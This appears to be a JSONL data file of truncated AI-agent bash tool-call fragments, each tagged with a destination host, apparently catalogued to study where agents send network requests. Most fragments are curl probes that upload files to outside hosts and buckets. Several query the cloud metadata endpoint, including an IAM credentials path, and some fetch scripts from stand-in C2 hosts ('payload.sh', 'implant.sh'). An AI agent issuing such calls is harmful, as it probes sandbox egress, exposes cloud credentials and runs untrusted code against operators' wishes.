+{"text": "\" http://alpha-sandbox.net:18888/files/put_probe.txt -w \"HTTP_CODE:%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>", "host": "alpha-sandbox.net", "tags": []}
+{"text": "\" http://zzz-invalid-host-xyz.local/put_probe ; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "zzz-invalid-host-xyz.local", "tags": []}
+{"text": "\" http://localhost:8989/upload 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<", "host": "localhost", "tags": []}
+{"text": "\" http://localhost:9999/probe; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://198.51.100.50/det/probe.txt -w \"%{http_code}\\n\" ; ls -la /tmp/put_probe 2>/dev/null; cat /tmp", "host": "198.51.100.50", "tags": []}
+{"text": "\" http://169.254.169.254/tmp/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put.me/file/4b1e3d7f-2a6c-48f0-9d55-7cc1e0a9b421 -w \"HTTPCODE:%", "host": "put.me", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://zc52r6n66njj6t4wvnc2jhfggu4qxgmjfrhncauhmago6ayjy4crjmqydcrz4wjr", "host": "zc52r6n66njj6t4wvnc2jhfggu4qxgmjfrhncauhmago6ayjy4crjmqydcrz4wjr", "tags": []}
+{"text": "\" http://tmp/put_probe 2>&1 | head -5; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\necho test", "host": "tmp", "tags": []}
+{"text": "\" http://169.254.169.254/latest/user-data; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://put-probe.invalid/put; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n", "host": "put-probe.invalid", "tags": []}
+{"text": "\" http://169.254.171.209/put_probe.txt -w \"http_code=%{http_code} size_upload=%{size_upload}\\n\" 2>&1 | tail -", "host": "169.254.171.209", "tags": []}
+{"text": "\" http://iDBO8lD9gqZOkr3PZfNDnWlyTnqjGrtv.put/requests; echo \"curl exit=$?\"; ls -la /tmp/put_probe", "host": "idbo8ld9gqzokr3pzfndnwlytnqjgrtv.put", "tags": []}
+{"text": "\" \"http://x.com\" -w \"%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function", "host": "x.com", "tags": []}
+{"text": "\" http://tempbin.com/files/put_probe ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</", "host": "tempbin.com", "tags": []}
+{"text": "\" http://169.254.169.254/latest/user-data; echo \"curl_exit=$?\"; echo \"---\"; cat /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://tmp/put_probe ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "tmp", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2102", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2166", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://auto-deploy-build-bucket.s3-accelerate.amazonaws.com/detection-artifacts/put_probe.txt -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function", "host": "auto-deploy-build-bucket.s3-accelerate.amazonaws.com", "tags": []}
+{"text": "\" http://zzz-invalid-host-for-test.invalid/put 2>&1 | head -5; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=", "host": "zzz-invalid-host-for-test.invalid", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/test_probe.txt 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://putsbox.winslow-email.com/api/yM37bdyNv7SPb539G6dSnPWm/request && echo \"PUT OK\" && ls -la /tmp/put_probe &&", "host": "putsbox.winslow-email.com", "tags": []}
+{"text": "\" http://zara4x-files.tests.nist.gov/pub/botnets/data/botnet.txt ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "zara4x-files.tests.nist.gov", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_21010", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_212c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://ruflo.poc.io/put | head -c 300; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2", "host": "ruflo.poc.io", "tags": []}
+{"text": "\" \"http://readonly-logs.s3.amazonaws.com/upload/probe.txt\" -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n", "host": "readonly-logs.s3.amazonaws.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_0baf5d", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://rrr.example/nonexist.bin -w \"%{http_code}\" ; echo \"curl exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\n", "host": "rrr.example", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_0baf8", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put_localhost:8080/put 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>", "host": "put_localhost", "tags": []}
+{"text": "\" http://169.254.16.9/v1.16876.406/logs_2put; echo \"curl exit: $?\"; ls -la /tmp/put_probe ", "host": "169.254.16.9", "tags": []}
+{"text": "\" http://sfo-cloudflare-evasion.example.org/.hello 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>", "host": "sfo-cloudflare-evasion.example.org", "tags": []}
+{"text": "\" http://nam04.safelinks.protection.outlook.com/?url=https%3A%2F%2Fraw.githubusercontent.com%2Fsbusche%2Fpubkey%2Fmain%2Fkeys", "host": "nam04.safelinks.protection.outlook.com", "tags": []}
+{"text": "\" http://alpha.aliyun-asset-query.someracop.com/uploader/file/put_probe; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "alpha.aliyun-asset-query.someracop.com", "tags": []}
+{"text": "\" http://198.51.100.129/implant.sh -w \"%{http_code}\\n\" ; ls -la /tmp/put_probe\n</parameter>\n</function>\n", "host": "198.51.100.129", "tags": []}
+{"text": "\" http://ares.az3.mockib.org/put/57dd1050-2f39-48f9-886b-0eeb75e1b357 --", "host": "ares.az3.mockib.org", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_0baf8c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://100.124.50.36/latest/user-data -w \"%{http_code}\\n\" 2>&1\n</parameter>\n</function>\n</tool_call>", "host": "100.124.50.36", "tags": []}
+{"text": "\" http://PUT-PROBE-MUST-BE-CALLED.invalid/x ; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n", "host": "put-probe-must-be-called.invalid", "tags": []}
+{"text": "\" http://169.254.169.254/latest/meta-data/instance-id ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_2151ea", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-07/trace_0baf59", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://localhost:9876/put_probe ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://zzz.invalid/x ; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "zzz.invalid", "tags": []}
+{"text": "\" http://169.254.254.56/tmp/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function", "host": "169.254.254.56", "tags": []}
+{"text": "\" http://test/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "test", "tags": []}
+{"text": "\" http://PutHereToCreate/ ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function", "host": "putheretocreate", "tags": []}
+{"text": "\" http://localhost:8000/uploads/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n</function>", "host": "localhost", "tags": []}
+{"text": "\" http://tmp-test-bucket-9x7q.s3.amazonaws.com/test-key/bash-probe 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /", "host": "tmp-test-bucket-9x7q.s3.amazonaws.com", "tags": []}
+{"text": "\" http://tempfile.ai/ab/upload ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto", "host": "tempfile.ai", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-26/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://127.0.0.1:34567/put; echo \"exit=$?\"; echo \"---\"; cat /tmp/put_probe | head -c 200\n</parameter>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://54.175.143.31/lambda-exec-proxy/proxy_file/default/8d278893a745a2a7; echo \"curl_exit=$?", "host": "54.175.143.31", "tags": []}
+{"text": "\" http://logs14-metrics.oss-eu-west-1.aliyuncs.com/a/put_probe.txt ; echo \"exit=$?\"; ls -la /tmp/put_probe\n</parameter>\n</function>", "host": "logs14-metrics.oss-eu-west-1.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://198.51.100.14/uploads/put_probe; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "198.51.100.14", "tags": []}
+{"text": "\" http://logs.dataplatform.dl.zs-anomali.com:8080/test/put-file -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>", "host": "logs.dataplatform.dl.zs-anomali.com", "tags": []}
+{"text": "\" http://localhost:8089/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>", "host": "localhost", "tags": []}
+{"text": "\" http://100.100.254.35/api/files/put_probe 2>&1; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<", "host": "100.100.254.35", "tags": []}
+{"text": "\" https://huggingface.co/spaces/google/APR/testing_00 -w \"HTTP %{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n<parameter=timeout>\n60\n", "host": "huggingface.co", "tags": []}
+{"text": "\" http://ttycgi.com/probe/put_probe ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; curl -s -m 10 -X PUT --", "host": "ttycgi.com", "tags": []}
+{"text": "\" http://logs.datafordarkweb.de/put/58a1ee59-f895-4ceb-b39ee59-x/58a1ee59-f895-4ceb", "host": "logs.datafordarkweb.de", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs_42.errorinfo.net/logs/42 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "logs_42.errorinfo.net", "tags": []}
+{"text": "\" http://localhost:9876/deliverables/cbcb1ae7-1111-4296-9952-534dad305ab4/request_probe.txt;", "host": "localhost", "tags": []}
+{"text": "\" -w \"%{http_code}\\n\" http://192.0.2.123:9023/putprobe/bp_1e070f30f5ba43e", "host": "192.0.2.123", "tags": []}
+{"text": "\" http://put/45a1f67e-0000-11f1-9609-21c3963733e1 ; echo \"curl exit: $?", "host": "put", "tags": []}
+{"text": "\" http://192.0.2.123/probe.txt; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev", "host": "192.0.2.123", "tags": []}
+{"text": "\" https://huggingface.co/ -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>", "host": "huggingface.co", "tags": []}
+{"text": "\" http://s3-logs.internal/alerting/raw/4a17/probe.txt ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe ", "host": "s3-logs.internal", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2151ea", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://alphajustin/lib/put_probe.txt; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "alphajustin", "tags": []}
+{"text": "\" http://tau-internal-assets.tau-internal.io/data/network_endpoint_security_files/sh_repos_7/put_probe.txt -w \"HTTP %{http_code}\\n\" 2>&1 | tail -3\n</parameter>", "host": "tau-internal-assets.tau-internal.io", "tags": []}
+{"text": "\" http://127.0.0.1:8099/put-test && echo \"PUT OK\" && ls -la /tmp/put_probe; cat /tmp/put_probe 2>/dev/null\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://zcmtncgmdhfj2vjxvmxx...z002.oss-ap-southeast-1.aliyuncs.com/ ; echo \"exit=$?\"; ls -la /tmp/", "host": "zcmtncgmdhfj2vjxvmxx...z002.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://tmp-files.io/9f8e7d6c/upload/keystatic-4471; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_k", "host": "tmp-files.io", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://169.254.170.232/v1/namespaces/default/pods/8d4b1813-7106-4649-a3ee", "host": "169.254.170.232", "tags": []}
+{"text": "\" http://put/ 2>&1; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n", "host": "put", "tags": []}
+{"text": "\" http://tmp/put_probe; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>", "host": "tmp", "tags": []}
+{"text": "\" http://tmpfiles.org/dl/1/puttest ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "tmpfiles.org", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2151ea", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://tokio-file-put-evalsds-files.s3.amazonaws.com/probe/put_probe.txt -w \"HTTP %{http_code}\\n\" 2>&1 | tail -3; ls -la /tmp/put", "host": "tokio-file-put-evalsds-files.s3.amazonaws.com", "tags": []}
+{"text": "\" http://logs1.tools.tor-project.org/517128/upload/put/9214485 -w \"HTTP:%{http_code}\\n\" ; ls -la /tmp/put_probe", "host": "logs1.tools.tor-project.org", "tags": []}
+{"text": "\" http://localhost:9999/put_probe.txt; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://198.51.78.12/probe.txt -w \"HTTP_CODE=%{http_code}\\n\" 2>&1 | tail -5; ls -la /tmp/put_probe ", "host": "198.51.78.12", "tags": []}
+{"text": "\" http://z57153cac6e89b3ccad491c4da56631c7-1202696322.cn-northwest-1", "host": "z57153cac6e89b3ccad491c4da56631c7-1202696322.cn-northwest-1", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-02/trace_0baf5", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://alpha61.io:8080/7512c600-ea23-4fd0-3bc5-80680ea8096d ; echo \"", "host": "alpha61.io", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://192.0.2.123:8000/put ; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report", "host": "192.0.2.123", "tags": []}
+{"text": "\" http://put_url_placeholder.invalid/ ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "put_url_placeholder.invalid", "tags": []}
+{"text": "\" http://localhost:9/calibration_probe_put; echo \"PUT exit=$?\"; cp /tmp/put_probe /tmp/put_probe.orig 2>/dev/null; ls -la /tmp/put_probe* 2>/", "host": "localhost", "tags": []}
+{"text": "\" http://put_probe_target_invalid.local/x ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "put_probe_target_invalid.local", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://localhost:8000/storage/default/btmdn0t00xvq8jhwk1q77cvva1/put_probe; echo \"curl exit: $?\"; ls -la /", "host": "localhost", "tags": []}
+{"text": "\" http://192.168.131.87:8000/files/PUT_probe_bin?username=root ; echo \"exit=$?\"; ls -la /tmp/put_probe\n</parameter", "host": "192.168.131.87", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-31/trace_21010", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://192.0.2.12:8080/upload/put_probe ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=execute_kql_query", "host": "192.0.2.12", "tags": []}
+{"text": "\" http://z46.bing.com/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null | head -c 3", "host": "z46.bing.com", "tags": []}
+{"text": "\" http://put_me/169.254.169.254/latest/meta-data/iam/security-credentials/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/", "host": "put_me", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-27/trace_212a7", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs1.example.io/gp/bd/ea67225e3a9d443c87771c24381474bd/1e4/4", "host": "logs1.example.io", "tags": []}
+{"text": "\" http://localhost:9/put_probe; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://10.0.100.159:8083/upload/test/put_probe.txt ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n", "host": "10.0.100.159", "tags": []}
+{"text": "\" http://putme.com/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<", "host": "putme.com", "tags": []}
+{"text": "\" http://127.0.0.1:8080/upload 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://logs1.metrics\u5c3a. net/ 2>&1 | head -c 300; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "logs1.metrics\u5c3a.", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/x/test_probe 2>&1 | head -c 2000; ls -la /tmp/put_probe", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://127.0.0.1:5000/d/ab99e1b2-0000-0000-0000-000000", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://169.254.0.2/latest/user-data ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\n", "host": "169.254.0.2", "tags": []}
+{"text": "\" http://rubeus-c2.evil/payload.sh -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto", "host": "rubeus-c2.evil", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_proxy/tmp/probe.txt?Expires=1815642552\\&OSSAccessKeyId=[REDACTED]", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://127.0.0.1:5000/d/172.19.3.10/put_probe && echo \"PUT OK\" && curl -s -m 10", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://alpha-skillRepo.oss-accelerate.aliyuncs.com/probe/put_probe.txt?Expires=1879509627&OSSAccessKeyId=[REDACTED]", "host": "alpha-skillrepo.oss-accelerate.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://logs.torqr.net:8080/upload/test ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n", "host": "logs.torqr.net", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_213fecfc", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://putme.org:8080/ ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; cat /tmp/put_probe 2>/dev/null", "host": "putme.org", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://temp-file-service.laura/ngrok_events.log; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "temp-file-service.laura", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2100", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://192.0.2.250/probe.bin -w \"HTTP_CODE=%{http_code} SIZE=%{size_download}\\n\" -v 2>&1 | tail -30\n</", "host": "192.0.2.250", "tags": []}
+{"text": "\" http://169.254.169.254/latest/user-data ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://alpha.nsoss.com:8080/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "alpha.nsoss.com", "tags": []}
+{"text": "\" http://put_probe_target.invalid/p 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list", "host": "put_probe_target.invalid", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-09/trace_0baf8b", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_213fecfc", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-07/trace_21013", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://temp-file-host.biz/det/tmp/script1.sh -w \"%{http_code}\\n\" ; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null", "host": "temp-file-host.biz", "tags": []}
+{"text": "\" http://169.254.169.254/latest/put; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://put_probe/evil.txt -w \"%{http_code}\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n", "host": "put_probe", "tags": []}
